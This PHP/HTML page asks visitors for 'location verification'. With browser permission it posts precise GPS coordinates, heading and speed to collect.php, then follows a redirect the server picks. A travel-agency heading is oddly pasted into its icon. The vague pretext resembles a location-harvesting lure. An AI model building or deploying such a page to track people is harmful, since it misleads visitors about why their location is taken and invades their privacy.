<?php
declare(strict_types=1);

session_start();

/*
 * Security headers.
 *
 * Geolocation requires HTTPS in normal production use.
 */
header('Permissions-Policy: geolocation=(self)');
header('X-Content-Type-Options: nosniff');
header('Referrer-Policy: strict-origin-when-cross-origin');

/*
 * Create a CSRF token for the location submission.
 */
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

$csrfToken = $_SESSION['csrf_token'];
?>
<!DOCTYPE html>
<html lang="en">
<head>

    <meta charset="UTF-8">

    <meta name="viewport"
          content="width=device-width, initial-scale=1.0">

    <title>Location Verification</title>

    <style>

        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            font-family: Arial, sans-serif;
            background: #f4f7fb;
        }

        .card {
            width: 100%;
            max-width: 520px;
            padding: 35px;
            background: #fff;
            border-radius: 18px;
            box-shadow: 0 15px 50px rgba(0,0,0,.12);
            text-align: center;
        }

        h1 {
            margin-top: 0;
            color: #172033;
        }

        p {
            color: #5d6575;
            line-height: 1.65;
        }

        .location-icon {
            width: 70px;
            height: 70px;
            margin: 0 auto 20px;
            border-radius: 50%;
            background: #edf4ff;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 32px;
        }

        button {
            width: 100%;
            padding: 15px 20px;
            border: 0;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 12px;
        }

        #allowBtn {
            background: #1264ff;
            color: #fff;
        }

        #skipBtn {
            background: #edf0f4;
            color: #333;
        }

        #status {
            margin-top: 18px;
            font-size: 14px;
        }

        .privacy {
            margin-top: 20px;
            font-size: 12px;
            color: #777;
        }

    </style>

</head>

<body>

<div class="card">

    <div class="location-icon">
        📍 <h2>Tour Operators: Find Travel Agencies Companies,Travel Agents</h2>
    </div>

    <h1>Location Verification</h1>

    <p>
        To continue, this website would like to use your
        device's current location.
    </p>

    <p>
        Your browser will display a location-permission
        request. Your location is only obtained if you
        choose to allow it.
    </p>

    <button id="allowBtn">
        Allow Location & Continue
    </button>

    <button id="skipBtn">
        Continue Without Location
    </button>

    <div id="status"></div>

    <div class="privacy">
        Location access is controlled by your browser.
    </div>

</div>

<script>

const csrfToken = <?= json_encode($csrfToken) ?>;

const allowBtn = document.getElementById('allowBtn');
const skipBtn  = document.getElementById('skipBtn');
const status   = document.getElementById('status');

function setStatus(message) {
    status.textContent = message;
}

allowBtn.addEventListener('click', function () {

    if (!window.isSecureContext) {

        setStatus(
            'Location access requires a secure HTTPS connection.'
        );

        return;
    }

    if (!navigator.geolocation) {

        setStatus(
            'Geolocation is not supported by this browser.'
        );

        return;
    }

    setStatus(
        'Requesting your location. Please respond to the browser permission prompt...'
    );

    navigator.geolocation.getCurrentPosition(

        function (position) {

            const coords = position.coords;

            const data = {
                csrf_token: csrfToken,

                latitude: coords.latitude,
                longitude: coords.longitude,

                accuracy: coords.accuracy,

                altitude:
                    coords.altitude !== null
                        ? coords.altitude
                        : null,

                heading:
                    coords.heading !== null
                        ? coords.heading
                        : null,

                speed:
                    coords.speed !== null
                        ? coords.speed
                        : null,

                location_timestamp: position.timestamp
            };

            setStatus(
                'Location obtained. Processing...'
            );

            fetch('collect.php', {

                method: 'POST',

                headers: {
                    'Content-Type': 'application/json'
                },

                body: JSON.stringify(data)

            })
            .then(response => response.json())

            .then(result => {

                if (result.success) {

                    setStatus(
                        'Location verification completed.'
                    );

                    /*
                     * Optional redirect.
                     */
                    if (result.redirect) {

                        window.location.href =
                            result.redirect;
                    }

                } else {

                    setStatus(
                        result.message ||
                        'Unable to process your location.'
                    );
                }

            })

            .catch(error => {

                console.error(error);

                setStatus(
                    'A server error occurred. Please try again.'
                );
            });

        },

        function (error) {

            let message =
                'Location access was not granted.';

            switch (error.code) {

                case error.PERMISSION_DENIED:
                    message =
                        'You denied location permission.';
                    break;

                case error.POSITION_UNAVAILABLE:
                    message =
                        'Your location is currently unavailable.';
                    break;

                case error.TIMEOUT:
                    message =
                        'Location request timed out.';
                    break;
            }

            setStatus(message);
        },

        {
            enableHighAccuracy: true,
            timeout: 20000,
            maximumAge: 0
        }

    );

});


/*
 * Continue without GPS.
 *
 * We deliberately do not silently collect GPS when the
 * visitor declines.
 */
skipBtn.addEventListener('click', function () {

    window.location.href =
        'https://www.tourtravelworld.com/travel-agents/nigeria/lagos-state-tour-operator.html';

});

</script>

</body>
</html>